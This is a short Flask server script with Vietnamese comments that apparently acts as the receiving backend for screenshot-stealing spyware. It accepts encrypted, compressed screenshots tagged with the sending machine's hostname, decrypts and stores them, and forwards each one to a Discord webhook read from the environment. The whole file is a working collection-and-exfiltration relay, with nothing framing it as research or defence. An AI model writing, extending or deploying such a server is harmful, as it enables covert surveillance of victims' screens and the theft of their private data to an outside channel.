from flask import Flask, request, jsonify
import os
import zlib
import base64
import json
from datetime import datetime
import requests
from cryptography.fernet import Fernet
from dotenv import load_dotenv

# Load biến môi trường (Discord webhook, secret key)
load_dotenv()

DISCORD_WEBHOOK_URL = os.getenv("DISCORD_WEBHOOK_URL")
FERNET_KEY = os.getenv("FERNET_KEY")  # Khóa Fernet 32-byte base64

app = Flask(__name__)
SAVE_FOLDER = "received"
os.makedirs(SAVE_FOLDER, exist_ok=True)

fernet = Fernet(FERNET_KEY)


def decrypt_and_decompress(data_base64: str) -> bytes:
    encrypted_data = base64.b64decode(data_base64)
    decrypted = fernet.decrypt(encrypted_data)
    return zlib.decompress(decrypted)


def send_to_discord(filename, filepath):
    if not os.path.exists(filepath):
        print(f"[!] File không tồn tại: {filepath}")
        return

    with open(filepath, "rb") as f:
        files = {"file": (filename, f, "image/png")}
        data = {"content": f"📷 Ảnh mới nhận: `{filename}`"}
        try:
            res = requests.post(DISCORD_WEBHOOK_URL, data=data, files=files)
            print(f"[Discord] Status: {res.status_code}")
        except Exception as e:
            print(f"[!] Lỗi gửi Discord: {e}")


@app.route("/", methods=["GET"])
def home():
    return "Server hoạt động", 200


@app.route("/upload", methods=["POST"])
def upload():
    try:
        content = request.get_json()
        sys_info = content["system_info"]
        image_enc = content["screenshot"]

        img_data = decrypt_and_decompress(image_enc)

        filename = f"{sys_info['hostname']}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.png"
        path = os.path.join(SAVE_FOLDER, filename)

        with open(path, "wb") as f:
            f.write(img_data)

        send_to_discord(filename, path)

        return jsonify({"status": "success", "filename": filename})
    except Exception as e:
        print(f"[!] Upload Error: {e}")
        return jsonify({"status": "error", "message": str(e)}), 400


if __name__ == "__main__":
    app.run(host="0.0.0.0", port=10000)
